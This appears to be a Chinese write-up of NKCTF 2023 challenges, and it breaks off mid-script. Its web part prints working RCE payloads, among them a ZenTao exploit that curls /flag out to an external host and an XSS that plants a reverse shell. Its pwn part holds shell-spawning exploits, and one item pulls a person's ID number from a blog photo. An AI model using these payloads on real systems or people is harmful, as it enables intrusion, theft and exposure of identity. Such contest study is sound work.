easypic\n\n**赛后复现**\n\n提示`出题人把flag偷偷藏在了加密盘里了，你知道怎么把它还原出来吗`\n\n先将图片后多余的数据分离，使用`veracrypt`挂载，密钥为分离出的`png`\n\n![](/img/wp/2023/2023nkctf-16.png)\n\n得到`flag.png`，图片尾得到`Tips:566*566`\n\n放大图片观察到很多像素点，提取然后拼接\n\n```python\nfrom PIL import Image\n\nimg=Image.open('flag.png')\nimg=img.resize((566,566),Image.NEAREST)\nimg.save('out.png')\n```\n\n得到flag\n`NKCTF{49ce8740502743585c4a44404e62d8f9}`\n\n\n\n## 五年Misc，三年模拟\n\n**赛后复现(套娃题)**\n\n\n压缩包注释`printf(\"%d%d%d%d%d%d\",key[]);`\n\n6位数字爆破，得到`114514`\n\n提示1：`“CA1N”也很“疑惑”呢`\n\n猜测是要对文件异或\n\n文件头为`13 08 40 47`，与常见文件头进行异或对比，发现异或`0x43`后为`zip`\n\n\n得到一个加密的压缩包，根据提示2`ZipCrypto`，猜测是深入明文攻击\n\n`echo -n \"handsome\" > plain.txt`\n`bkcrack -C out.zip -c handsome.zip -p plain.txt -o 30 -x 0 504b0304`\n\n\n![](/img/wp/2023/2023nkctf-17.png)\n\n\n改密码\n\n`bkcrack -C out.zip -k 0247f1a3 5da9d4ac 1ae8312c -U 1.zip easy`\n\n\n解压出来一个`handsome.jpg`和带密码的`5.rar`\n\n自拍照并没什么用，hashcat爆破`rar`\n\nrar2john提取hash\n`$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602`\n\nhashcat爆破密码\n`hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u`\n\n最终得到密码`BUSADJ`\n\n![](/img/wp/2023/2023nkctf-18.png)\n\n解压出的图片尾藏了一个逆序的png\n\n```python\nwith open('5.png','rb') as f:\n   with open('6.png','wb') as g:\n      g.write(f.read()[::-1])\n```\n\n修改高度，得到压缩包的密码`be8b06bc13780abf`\n\n解压出的`GGGGGGG.png`结尾有串字符`5D93CEB70E2BF5DAA84EC3D0CD2C731A`\n\n32位的，推测为md5，在线网站得到`qwer1234`\n\n![](/img/wp/2023/2023nkctf-19.png)\n\n\n拿这个密码去跑`cloacked-pixel`，得到下一层压缩包密码`f442212b3d398a8e`\n\n\n根据提示是steghide爆破，那直接用stegseek跑了，得到下一层密码`764dc6c0361fc0fd`\n\n\n看文件头，明显的F5隐写，得到下一层密码`un7pXkXMD6J5P5jKzP3FCCVJ4VFtTF26`\n\n\nwav文件，一听就是sstv了，得到`NKCTF{iLiKECTFbec@u5eDreaM!}`\n\n\n![](/img/wp/2023/2023nkctf-20.png)\n\n## baby_bitlocker\n\n**赛后复现**\n\n先做`2023.3.2`\n\n看的出来，出题人很喜欢明文攻击\n\n[pcapng文件格式](https://pcapng.com/)\n\n`echo \"4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF\" | xxd -r -ps > plain.txt`\n`bkcrack -C crack.zip -c usb.pcapng -p plain.txt -o 8`\n`bkcrack -C crack.zip -k 92ac142d 9bd136b1 ac01a95d -U out.zip easy`\n\n解压后得到`tonF.docx`和`usb.pcapng`\n\n对数据包分析，发现是usb键盘流量，使用`UsbMiceDataHacker`提取\n`PassWord:<SPACE>NKCTF2023_YYDS_YYDS!!!<SPACE><SPACE><SPACE><SPACE><SPACE><SPACE><DEL><DEL><DEL><DEL><DEL><DEL>`\n\ndocx密码为`NKCTF2023_YYDS_YYDS!!!`\n\n进入文档后发现字体为`Byxs20_font`\n\n且文档中的内容复制后与文档内不一样了\n\n![](/img/wp/2023/2023nkctf-21.png)\n\nodttf转ttf\n\n打开`/word/fontTable.xml`，得到`font-name`为`Byxs20_font`，`fontKey`为`{F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A}`\n\n将`\\word\\fonts\\font1.odttf`重命名为`F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf`\n\npython转换\n```python\nimport os\n\nodttf_name = \"./F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf\"\nodttf_path = os.path.abspath(odttf_name)\n\nwith open(odttf_path, \"rb\") as f:\n    data = f.read()\n\n# 获取文件名\nfile_name = os.path.splitext(odttf_path)[0].split(\"\\\\\")[-1].replace(\"-\", \"\")\n\n# 获取key\nkey = []\nfor i in range(len(file_name), 0, -2):\n    key.append(int(file_name[i-2:i], 16))\n\nwith open(\"./font1.ttf\", \"wb\") as f:\n    for i in range(32):\n        f.write(bytes([data[i] ^ key[i % len(key)]]))\n    f.write(data[32:])\n```\n\nfontforge识别\n\n![](/img/wp/2023/2023nkctf-22.png)\n\n\n得到一半flag：`nkctf{ttf_is_funny_`\n\n\n接着做`2023.3.4`\n\n内存取证\n`python vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -iE \"flag|.zip$|.rar$|.7z$|.txt$|.png$|.jpg$|.gif$|.pdf$|.doc$|.docx$|.pcapng$|.raw$|.kdbx$\"`\n\n![](/img/wp/2023/2023nkctf-23.png)\n\n提取`PYTHON.rar`\n\n`python vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000017f55070 -D ./`\n\n![](/img/wp/2023/2023nkctf-24.png)\n\n用这个密钥恢复加密分区\n\n![](/img/wp/2023/2023nkctf-25.png)\n\n得到`bitlocker_is_very_interesting}`\n\n\n最后看`2023.3.3`\n\nhint：`flag2图片十分有规律的3x3，到底是来自几进制的秘密呢？`\n\n根据提示`3x3`，猜测是4进制\n\nexiftool得到提示`上北下南左西右东`\n\n![](/img/wp/2023/2023nkctf-26.png)\n\npython提取\n```python\nimport cv2\n\nimg = cv2.imread(\"./flag2.png\",cv2.IMREAD_UNCHANGED)\n\nr,c = img.shape\n\n#flag_xy = [(0,0),(2,0),(1,1),(0,2),(2,2)]\nflag2_xy = [(1,0),(1,2),(0,1),(2,1)]\n\nfor y in range(0,r,3):\n    for x in range(0,c,3):\n        roi_img = img[y: y+3, x: x+3]\n\n        #for i in flag_xy:\n        #    print(chr(roi_img[i[::-1]]),end=\"\")\n\n        tmp = \"\"\n        for i in flag2_xy:\n            tmp += str(roi_img[i[::-1]])\n        print(chr(int(tmp,4)),end=\"\")\n```\n\n得到`flag2 is here: images_are_fun_`\n\n\n\n三段flag拼接起来`NKCTF{TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING}`\n\n\n# Blockchain\n\n## SignIn\n\n区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text\n\n![](/img/wp/2023/2023nkctf-27.png)\n\n\n## HelloWorld\n\nnc后先创建部署题目的合约账户\n水龙头转账，部署合约\n\n查看合约代码\n```solidity\npragma solidity 0.8.7;\n\ncontract HelloWorld {\n    string greeting;\n\n    constructor(string memory _greeting) public {\n        greeting = _greeting;\n    }\n\n    function greet() public view returns (string memory) {\n        return greeting;\n    }\n\n    function setGreeting(string memory _greeting) public {\n        greeting = _greeting;\n    }\n\n    function isSolved() public view returns (bool) {\n        string memory expected = \"Hello,NKCTF2023\";\n        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));\n    }\n}\n```\n\n调用`setGreeting`改`greeting`的值即可\n\n在`metamask`中链接题目给的私链\n\n![](/img/wp/2023/2023nkctf-28.png)\n\n使用`remix ide`\n\n编译后指定题目部署的地址\n\n调用`setGreeting`，参数输出字符串`\"Hello,NKCTF2023\"`\n\n![](/img/wp/2023/2023nkctf-29.png)\n\n在Metamask确认交易请求\n\n等待交易打包，确认上链\n\n![](/img/wp/2023/2023nkctf-30.png)\n\n\n\n## decompile_revenge\n\n与第一题一样，不过sha256加密了\n在提供的网站上解\n\n![](/img/wp/2023/2023nkctf-31.png)\n\n`NKCTF{This_1s_Decompile_Rev3nge!!!!}`\n\n\n# web\n\n## baby_php\n\n反序列化\n\n```php\n<?php\n    error_reporting(0);\n    class Welcome{\n        public $name;\n        public $arg = 'oww!man!!';\n        public function __construct(){\n            $this->name = 'ItS SO CREAZY';\n        }\n        public function __destruct(){\n            if($this->name == 'welcome_to_NKCTF'){\n                echo $this->arg;\n            }\n        }\n    }\n\n    function waf($string){\n        if(preg_match('/f|l|a|g|\\*|\\?/i', $string)){\n            die(\"you are bad\");\n        }\n    }\n    class Happy{\n        public $shell;\n        public $cmd;\n        public function __invoke(){\n            $shell = $this->shell;\n            $cmd = $this->cmd;\n            waf($cmd);\n            eval($shell($cmd));\n        }\n    }\n    class Hell0{\n        public $func;\n        public function __toString(){\n            $function = $this->func;\n            $function();\n        }\n    }\n\n    if(isset($_GET['p'])){\n        unserialize($_GET['p']);\n    }else{\n        highlight_file(__FILE__);\n    }\n?>\n```\n\n最终需要在Happy类中执行eval，`__invoke`在将对象当作函数来使用时调用此方法，在`Hell0`类中可以调用函数`$function()`以触发`__invoke`，而调用函数需要触发`__toString`方法，而在`Welcome`类中存在`echo`，可以触发`__toString`\n\n反序列化后会有一个waf方法来检查`$cmd`中的值是否存在`f`,`l`,`a`,`g`,`*`,`?`\n\n列目录：`dir /`\n\n`O:7:\"Welcome\":2:{s:4:\"name\";s:16:\"welcome_to_NKCTF\";s:3:\"arg\";O:5:\"Hell0\":1:{s:4:\"func\";O:5:\"Happy\":2:{s:5:\"shell\";s:6:\"system\";s:3:\"cmd\";s:5:\"dir /\";}}}`\n\n![](/img/wp/2023/2023nkctf-32.png)\n\n读`/f1ag`：使用`gzdecode`编码绕过\n\n\npayload\n```php\n<?php\n\n//$cmd='system(\"more /*\");';\n//echo urlencode(gzencode($cmd));\n\nclass Welcome{\n\tpublic $name='welcome_to_NKCTF';\n\tpublic $arg = 'Hell0';\n}\nclass Happy{\n\tpublic $shell='gzdecode';\n\tpublic $cmd='';\n\tfunction __construct(){\n\t\t$this->cmd = urldecode('%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00');\n\t}\n}\nclass Hell0{\n\tpublic $func='Happy';\n}\n\n$a = new Welcome();\n$a->arg = new Hell0();\n$a->arg->func = new Happy();\necho urlencode(serialize($a));\n?>\n```\n\n`O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D`\n\n![](/img/wp/2023/2023nkctf-33.png)\n\n\n## eazy_php\n\n```php\n<?php\n    highlight_file(__FILE__);\n    error_reporting(0);\n    if($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])){\n        if((string)$_POST['c'] != (string)$_POST['d'] && sha1($_POST['c']) === sha1($_POST['d'])){\n            if($_GET['e'] != 114514 && intval($_GET['e']) == 114514){\n                if(isset($_GET['NS_CTF.go'])){\n                    if(isset($_POST['cmd'])){\n                        if(!preg_match('/[0-9a-zA-Z]/i', $_POST['cmd'])){\n                            eval($_POST['cmd']);\n                        }else{\n                            die('error!!!!!!');\n                        }\n                    }else{\n                        die('error!!!!!');\n                    }\n                }else{\n                    die('error!!!!');\n                }\n            }else{\n                die('error!!!');\n            }\n        }else{\n            die('error!!');\n        }\n    }else{\n        die('error!');\n    }\n?>\n```\n\n第一层md5弱比较，使用数组绕过\n`a[]=1&b[]=2`\n\n第二层sha1强比较\n`c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1`\n\n\n第三层数字比较缺陷，使用小数类型\n`e=114514.20`\n\n第四层php变量值特性，使用`[`代替`_`\n`NS[CTF.go`\n\n第五层无字母数字rce，使用取反\n`cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);`\n\n## easy_cms\n\n访问后台`/dede/`，用户名`admin`，密码`admin`\n\n左侧核心栏中有个文件式管理器，可以上传文件\n\n存在过滤\n```php\n// 不允许这些字符\n$content = preg_replace(\"#(/\\*)[\\s\\S]*(\\*/)#i\", '', $content);\n\nglobal $cfg_disable_funs;\n$cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace';\n$cfg_disable_funs = $cfg_disable_funs.',[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert';\nforeach (explode(\",\", $cfg_disable_funs) as $value) {\n    $value = str_replace(\" \", \"\", $value);\n    if(!empty($value) && preg_match(\"#[^a-z]+['\\\"]*{$value}['\\\"]*[\\s]*[([{]#i\", \" {$content}\") == TRUE) {\n        $content = dede_htmlspecialchars($content);\n        die(\"DedeCMS提示：当前页面中存在恶意代码！<pre>{$content}</pre>\");\n    }\n}\n\nif(preg_match(\"#^[\\s\\S]+<\\?(php|=)?[\\s]+#i\", \" {$content}\") == TRUE) {\n    if(preg_match(\"#[$][_0-9a-z]+[\\s]*[(][\\s\\S]*[)][\\s]*[;]#iU\", \" {$content}\") == TRUE) {\n        $content = dede_htmlspecialchars($content);\n        die(\"DedeCMS提示：当前页面中存在恶意代码！<pre>{$content}</pre>\");\n    }\n    if(preg_match(\"#[@][$][_0-9a-z]+[\\s]*[(][\\s\\S]*[)]#iU\", \" {$content}\") == TRUE) {\n        $content = dede_htmlspecialchars($content);\n        die(\"DedeCMS提示：当前页面中存在恶意代码！<pre>{$content}</pre>\");\n    }\n    if(preg_match(\"#[`][\\s\\S]*[`]#i\", \" {$content}\") == TRUE) {\n        $content = dede_htmlspecialchars($content);\n        die(\"DedeCMS提示：当前页面中存在恶意代码！<pre>{$content}</pre>\");\n    }\n}\n```\n\n使用`scandir`列目录\n\n```php\n<?php\nvar_dump(scandir('/'));\n?>\n```\n\n使用`include`读文件\n\n```php\n<?php\ninclude '/f1Aggg';\n?>\n```\n\n![](/img/wp/2023/2023nkctf-34.png)\n\n\n## webpagetest\n\nwebpagetest反序列化\n\n[AVD-2022-1474319](https://xz.aliyun.com/t/11798)\n\n借助`phpggc`生成执行`cat /flag`命令的`phar`文件并发送\n\n```text\n./phpggc Monolog/RCE2 system 'cat /flag' -p phar -o testinfo.ini\n\nURLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d \"\\n\" | sed \"s#..#%&#g\")\n\ncurl -sSkig 'http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php' -d 'rkey=gadget' -d \"ini=$URLENC_PAYLOAD\" -o -\n\ncurl -sSkig 'http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php' -d 'rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo' -d \"ini=$URLENC_PAYLOAD\" -o -\n```\n\n![](/img/wp/2023/2023nkctf-35.png)\n\n\n## easy_pms\n\n右键查看网页源代码得到版本为`18.0.beta1`\n\ngithub搜到[poc](https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py)\n\n\n修改一下，加个回显，用`curl`外带到第三方平台\n`/flag`太长用`grep+base64`筛选\n\n```python\n# -*- coding: UTF-8 -*-\n# !/usr/bin/python\n\n'''\n权限绕过+RCE POC 伪静态传参版\n禅道系统 影响版本 安全版本\n开源版 17.4以下的未知版本<=version<=18.0.beta1 18.0.beta2\n旗舰版 3.4以下的未知版本<=version<=4.0.beta1 4.0.beta2\n企业版 7.4以下的未知版本<=version<=8.0.beta1 8.0.beta2\n'''\nimport requests\n\nproxies = {\n    #\"http\": \"127.0.0.1:8080\",\n    #\"https\": \"127.0.0.1:8080\",\n}\ndef check(url):\n    # url=\"http://10.211.55.3:8008\"\n    url1 = url+'/misc-captcha-user.html'\n    # url1 = url+'/index.php?m=misc&f=captcha&sessionVar=user'#非伪静态版本按照此格式传参\n    # url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'#可判断验证绕过的链接\n    url3 = url + 'repo-create.html'\n    url4 = url + 'repo-edit-10000-10000.html'\n    headers={\n        \"User-Agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\",\n        \"Accept-Language\":\"zh-CN,zh;q=0.9\",\n        \"Cookie\":\"zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default\",\n    }\n\n    headers2 = {\n        \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\",\n        \"Accept-Language\": \"zh-CN,zh;q=0.9\",\n        \"Cookie\": \"zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default\",\n        \"Content-Type\":\"application/x-www-form-urlencoded\",\n        \"X-Requested-With\":\"XMLHttpRequest\",\n        \"Referer\":url+\"/repo-edit-1-0.html\"\n    }\n\n    data1 = 'product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid='\n    data2 = 'SCM=Subversion&client=`curl http://tmar9l37.requestrepo.com/?1=\\\\`cat /flag|grep NKCTF|base64\\\\``'\n    s=requests.session()\n    try:\n        req1 = s.get(url1,proxies=proxies,timeout=5,verify=False,headers=headers)\n        req3 = s.post(url3,data=data1,proxies=proxies,timeout=5,verify=False,headers=headers2)\n        req4 = s.post(url4,data=data2,proxies=proxies,timeout=5,verify=False,headers=headers2)\n        print(req4.text)\n    except Exception as e:\n        print(e)\n    return False\nif __name__ == '__main__':\n    print(check(\"http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/\"))\n```\n\n![](/img/wp/2023/2023nkctf-36.png)\n\n\n## xiaopi\n\n小皮存储型XSS->rce\n\n[参考文章](https://blog.csdn.net/weixin_46944519/article/details/128954060)\n\n\n请求头加上`X-Requested-With: XMLHttpRequest`就能访问登录框\n\nvps上放定时任务，反弹shell\n```js\nfunction poc(){\n  $.get('/service/app/tasks.php?type=task_list',{},function(data){\n    var id=data.data[0].ID;\n    $.post('/service/app/tasks.php?type=exec_task',{\n      tid:id\n    },function(res2){\n        $.post('/service/app/log.php?type=clearlog',{\n\n        },function(res3){},\"json\");\n\n\n    },\"json\");\n  },\"json\");\n}\nfunction save(){\n  var data=new Object();\n  data.task_id=\"\";\n  data.title=\"test\";\n  data.exec_cycle=\"1\";\n  data.week=\"1\";\n  data.day=\"3\";\n  data.hour=\"16\";\n  data.minute = \"35\";\n  data.shell='bash -i >& /dev/tcp/20.2.129.79/8888 0>&1';\n  $.post('/service/app/tasks.php?type=save_shell',data,function(res){\n    poc();\n  },'json');\n}\nsave();\n```\n\n`python`开启一个`http`服务\n\n`python3 -m http.server 7777`\n\n![](/img/wp/2023/2023nkctf-37.png)\n\n在登录处用户名框中插入`<script src=http://20.2.129.79:7777/1.js></script>`\n\n![](/img/wp/2023/2023nkctf-38.png)\n\n插入完后等待管理员bot登录，触发计划任务，反弹shell\n\n![](/img/wp/2023/2023nkctf-39.png)\n\n\n## hard_php\n\n**赛后复现**\n\nctfshow的题目加上一些函数禁用\n\n```php\n<?php\n// not only ++\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nif (isset($_POST['NKCTF'])) {\n    $NK = $_POST['NKCTF'];\n    if (is_string($NK)) {\n        if (!preg_match(\"/[a-zA-Z0-9@#%^&*:{}\\-<\\?>\\\"|`~\\\\\\\\]/\",$NK) && strlen($NK) < 105){\n            eval($NK);\n        }else{\n            echo(\"hacker!!!\");\n        }\n    }else{\n        phpinfo();\n    }\n}\n?>\n```\n\n\n``NKCTF=$_=(０/０)._;$_=$_[''=='$'];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_='_'.$__.($_++).$_;$$_[__]($$_[_]);&__=shell_exec&_=echo `cat /flag`>/var/www/html/3.txt``\n\nurl编码后上传\n\n\n\n# Social Engineering\n\n## Bridge\n\n百度识图得到关键信息`海口`，进新闻得到`世纪大桥`，在`世纪大桥`旁边有一个`世纪公园`\n\n![](/img/wp/2023/2023nkctf-40.png)\n\n`NKCTF{海南省海口市龙华区世纪公园}`\n\n\n## 两个人的夜晚\n\n根据图上的`NCC新城市中心`去百度地址\n\n`NKCTF{天津市西青区中北镇万卉路3号NCC新城市中心}`\n\n## 狂飙\n\n抖音搜狂飙取景地得到`莲平路`\n\n![](/img/wp/2023/2023nkctf-41.png)\n\n`NKCTF{广东省江门市蓬江区莲平路}`\n\n## real-social-engineering\n\ngithub搜他id，找到博客地址：https://tacooo0o.github.io/\n\n在`2021年终总结`这篇文章中找到驾驶证图片，包含了身份证信息\n\n`NKCTF{6107**********4710}`\n\n\n## Ferris_Wheel\n\n百度识图得到`永川`，`摩天轮`，`渝西`等关键词\n\n![](/img/wp/2023/2023nkctf-42.png)\n\n百度地图找到渝西之眼，组合爆破下地名\n\n`NKCTF{重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮}`\n\n## 旅程的开始\n\n百度地图搜`中铁酒店`，得到`贵阳火车站`，实景一点一点与图片对比\n\n![](/img/wp/2023/2023nkctf-43.png)\n\n`NKCTF{贵州省贵阳市南明区遵义路1号}`\n\n\n## The other Bridge\n\n百度识图，得到`戴家巷崖壁步道`\n\n![](/img/wp/2023/2023nkctf-44.png)\n\n\n根据提示加个`畔`\n\n`NKCTF{重庆市江北区嘉陵江畔戴家巷崖壁步道}`\n\n## decompile\n\n步骤与上面的`decompile_revenge`一样\n\n`NKCTF{N0w_you_kn0w_d3compl1te_bytecode}`\n\n\n# pwn\n\n## ezshellcode\n\n```python\nfrom pwn import *\ne=ELF('./pwn')\ncontext.binary=e\n#p=process('./pwn')\np=remote(\"node.yuzhian.com.cn:32220\")\nshell=asm(shellcraft.sh()).rjust(0x100,b'\\x90')\np.sendafter(b'min!',shell)\np.interactive()\n```\n\n## a_story_of_a_pwner\n\n```python\nfrom pwn import *\n#p=process('./pwn')\np=remote('node.yuzhian.com.cn:36024')\nlibc=ELF('./libc.so.6')\ne=ELF('./pwn')\ncontext.binary=e\n\np.sendlineafter('> \\n','4')\np.readuntil('see this. ')\n\nd=int(p.readline().decode().strip(),16)\nprint(hex(d))\n\nlibc.address=d-libc.sym['puts']\nprint(hex(libc.address))\n\nrdi=libc.address+0x0019764d\nbin_sh=next(libc.search(b'/bin/sh'))\nsystem=libc.sym['system']\n\np.sendlineafter('> \\n','1')\np.sendafter('comment?',p64(bin_sh))\n\np.sendlineafter('> \\n','2')\np.sendafter('corment?',p64(rdi))\n\np.sendlineafter('> \\n','3')\np.sendafter('corMenT?',p64(system))\n\npayload=b'a'*0xa+p64(0x405098)+p64(0x401502)\np.sendlineafter('> \\n','4')\np.send(payload)\n\np.interactive()\n```\n\n\n## ez_stack\n\n```python\nfrom pwn import *\ne=ELF('./ez_stack')\ncontext.binary=e\nax_f=0x401146\nsyscall=0x40114e\nbss=e.bss(0x400)\n\n#p=process('./ez_stack')\np=remote('node2.yuzhian.com.cn','39605')\n\nsig=SigreturnFrame()\nsig.rax=0\nsig.rip=syscall\nsig.rdi=0\nsig.rsi=bss\nsig.rdx=0x200\nsig.rsp=bss+8\n\npayload=b'a'*0x10+b'b'*8+p64(ax_f)+p64(syscall)+flat(sig)\n\np.sendafter('NKCTF!\\n',payload)\n\nsig1=SigreturnFrame()\nsig1.rax=59\nsig1.rdi=bss\nsig1.rsi=0\nsig1.rdx=0\nsig1.rsp=bss+0x200\nsig1.rip=syscall\n\npayload1=b'/bin/sh\\x00'+p64(ax_f)+p64(syscall)+flat(sig1)\np.send(payload1)\n\n\np.interactive()\n```\n\n\n## baby_rop\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level='debug'\ndebug=0\nwhile True:\n    if debug==1:\n        p=process(\"./nkctf_message_boards\")\n    else:\n        p=remote('node2.yuzhian.com.cn:31457')\n    try:\n\n        e=ELF(\"nkctf_message_boards\")\n        func='puts'\n        func_got=e.got[func]\n        puts=e.plt['puts']\n        rdi=0x00401413\n        leave=0x40138a\n        bss=e.bss(0x200)\n        read=0x401351\n        main=e.sym['main']\n        ret=0x00401434\n        #gdb.attach(p,'bp 0x401318\\nbp 0x40138a')\n        p.sendlineafter('name: ',b'%41$p')\n        p.readuntil('Hello, ')\n        canary=int(p.readuntil('What',drop=1),16)\n        print(hex(canary))\n        n=0x30\n        pad=b'a'*n\n        payload=pad+p64(ret)*13+p64(rdi)+p64(func_got)+p64(puts)+p64(main)\n        payload=payload.ljust(0xf8,b'\\x00')\n        payload+=p64(canary)\n        p.sendafter('NKCTF: ',payload)\n        p.readuntil('carefully.\\n')\n        d=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\n        print(hex(d))\n        if debug==1:\n            libc=ELF(\"/lib/x86_64-linux-gnu/libc-2.33.so\")\n            libc.address=d-libc.sym[func]\n            system=libc.sym['system']\n            bin_sh=next(libc.search(b\"/bin/sh\\x00\"))\n            gdb.attach(p)\n        else:\n            libc=LibcSearcher(func,d)\n            system=libc.dump('system')\n            bin_sh=libc.dump('str_bin_sh')\n\n\n        payload=p64(ret)*0x1a+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)\n        payload+=p64(ret)\n        payload+=p64(canary)\n\n        p.sendlineafter('name: ',b'%41$p')\n        p.sendafter('NKCTF: ',payload)\n\n        p.interactive()\n    except:\n\n        pass\n    try:\n        p.close()\n    except:\n        pass\n```\n\n## baby_heap\n\n```python\nfrom pwn import *\ne=ELF('./pwn')\ncontext.binary=e\nlibc=ELF(\"./libc-2.32.so\")\n#libc=ELF('/lib/x86_64-linux-gnu/libc-2.33.so')\ndef add(ind,size):\n    p.sendlineafter(\"choice: \",b'1')\n    p.sendlineafter(\"index: \",str(ind))\n    p.sendlineafter('Size: ',str(size))\n\n\ndef free(ind):\n    p.sendlineafter(\"choice: \",b'2')\n    p.sendlineafter(\"index: \",str(ind))\n\n\ndef edit(ind,data):\n    p.sendlineafter(\"choice: \",b'3')\n    p.sendlineafter(\"index: \",str(ind))\n    p.sendafter('content: ',data)\n\n\ndef show(ind):\n    p.sendlineafter(\"choice: \",b'4')\n    p.sendlineafter('index: ',str(ind))\n\ndef calc_fd(c,off):\n    off1=off\n    off=off\n    h=hex(c)[2:].strip('L')[::-1]\n    e=[]\n    for i in range(0,len(h),3):\n        e.append(h[i:i+3][::-1])\n    uh=[]\n    xc=0\n    for i in e:\n        hc=int(i,16)^(xc+(off&0xfff))\n        xc=hc\n        off=off>>12\n        uh.append(hex(hc)[2:].strip('L').zfill(3))\n    heap_len=len(h)-3\n    uh=''.join(uh[::-1])[-heap_len:]+'000'\n    fd=int(uh,16)+off1\n    return fd\n\ndef enc_fd(fd,next_):\n    return (fd>>12)^next_\n\n\n#p=process('./pwn')\np=remote('node2.yuzhian.com.cn','32973')\n\nfor i in range(9):\n    add(i,0x88)\n\nfor i in range(8):\n    